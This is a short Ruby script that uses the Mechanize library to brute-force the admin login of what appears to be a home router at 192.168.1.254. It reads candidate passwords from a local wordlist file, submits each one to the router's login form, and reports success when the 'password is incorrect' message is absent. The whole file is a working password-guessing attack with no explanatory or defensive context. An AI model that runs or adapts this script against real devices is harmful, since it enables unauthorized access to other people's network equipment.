#!/usr/bin/env ruby
#
# http://192.168.1.254/xslt?PAGE=A06&THISPAGE=&NEXTPAGE=A06

@file = File.open('/Users/mephux/Source/passwords/wpa.txt')

require 'rubygems'
require 'mechanize'

a = Mechanize.new

a.get('http://192.168.1.254/xslt?PAGE=A06&THISPAGE=&NEXTPAGE=A06') do |page|
  
  @file.each_line do |password|
    next unless password[/^e/]

    puts password
    login_form = page.form_with(:action => '/xslt', :method => 'POST')
    login_form['PASSWORD'] = password
    page = a.submit login_form

    if page.body =~ /The password is incorrect./
      puts 'FAIL'
    else
      puts 'W0ots'
      puts password
      exit -1
    end
  end

end
